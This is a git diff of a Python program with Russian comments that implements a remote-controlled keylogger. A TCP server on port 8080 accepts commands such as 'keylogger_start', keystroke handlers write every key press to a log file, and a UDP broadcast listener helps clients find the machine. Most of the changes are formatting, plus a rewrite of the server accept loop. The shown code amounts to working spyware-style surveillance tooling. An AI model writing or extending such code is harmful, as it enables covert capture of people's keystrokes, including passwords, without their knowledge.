@@ -14,17 +14,20 @@ recording = False
 output = None
 keyboard_listener = None  # Хранить слушателя клавиатуры
 
+
 # Функция для записи в лог
 def log_action(action):
     print(f"Logging action: {action}")
     with open(FILE_NAME, "a") as f:
         f.write(action + "\n")
 
+
 # Функция для очистки лог-файла
 def clear_log_file():
     with open(FILE_NAME, "w") as f:
         f.truncate()  # Очищаем содержимое файла
     log_action("Log file cleared.")  # Записываем в лог, что файл очищен
+
 
 # Функция для записи нажатий клавиш
 def on_press(key):
@@ -33,12 +36,14 @@ def on_press(key):
     except AttributeError:
         log_action(f"Special key pressed: {key}")  # Записываем специальные клавиши (Shift, Ctrl и т.д.)
 
+
 # Функция для завершения работы
 def onexit():
     if output:
         output.close()
     if keyboard_listener:
         keyboard_listener.stop()  # Останавливаем слушатель
+
 
 # Обработка входящих соединений
 def handle_client(conn):
@@ -55,7 +60,6 @@ def handle_client(conn):
             print("Received command: {}".format(command))
         else:
             continue
-
 
         if command == "keylogger_start":
             if not recording:
@@ -157,21 +161,26 @@ def handle_client(conn):
         else:
             conn.sendall(b"Command not recognized")
 
+
 def start_server():
-    # Create a TCP socket for client connections
-    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    tcp_server_socket.bind(('', 8080))
-    tcp_server_socket.listen(5)  # Allow up to 5 pending connections
-    print("Server listening for TCP connections on port 8080...")
+    # # Create a TCP socket for client connections
+    # tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # tcp_server_socket.bind(('0.0.0.0', 8080))
+    # tcp_server_socket.listen(5)  # Allow up to 5 pending connections
+    # print("Server listening for TCP connections on port 8080...")
 
     # Create a separate thread for listening to UDP broadcasts
     threading.Thread(target=udp_broadcast_listener, daemon=True).start()
 
-    while True:
-        conn, addr = tcp_server_socket.accept()
-        print(f"Client connected from {addr}")
-        # Handle the client in a new thread
-        threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+        server_socket.bind(('0.0.0.0', 8080))
+        server_socket.listen(1)
+        print("Server listening on port 8080")
+        while True:
+            conn, addr = server_socket.accept()
+            print("Connection from {}".format(addr))
+            threading.Thread(target=handle_client, args=(conn,)).start()
+
 
 def udp_broadcast_listener():
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
